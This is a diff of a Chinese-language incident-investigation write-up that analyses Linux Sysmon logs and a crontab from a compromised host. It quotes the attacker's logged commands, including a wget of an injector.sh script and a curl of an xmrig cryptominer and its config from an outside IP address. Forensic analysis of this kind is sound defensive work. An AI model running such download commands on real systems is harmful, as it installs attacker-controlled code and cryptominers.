@@ -372,7 +372,7 @@ grafana
 
 查看 `Persistence\ip-172-31-13-147-20221124-1501-cron-tab-list.txt` 文件，得到以下信息
 
-```shell
+```bash
 30 8 * * * /opt/automation/updater.sh
 ENDOFUSERCRON
 ubuntu
@@ -394,7 +394,7 @@ ENDOFUSERCRON
 
 > TA 使用哪个程序下载了 injector.sh 脚本？
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp/var/log]
 └──╼ $ cat syslog | grep "injector.sh"
 Nov 24 08:30:01 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T08:30:01.467399000Z"/><EventRecordID>75097</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 08:30:01.467</Data><Data Name="ProcessGuid">{c9eb4a87-2b89-637f-700c-0807f5550000}</Data><Data Name="ProcessId">3372</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/root</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">64</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-2b89-637f-4894-b7e93f560000}</Data><Data Name="ParentProcessId">3371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
@@ -423,7 +423,7 @@ wget
 
 直接以 `/usr/bin/curl` 作为关键词进行定位
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp/var/log]
 └──╼ $ cat syslog | grep "/usr/bin/curl"
 Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.882033000Z"/><EventRecordID>76954</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.884</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
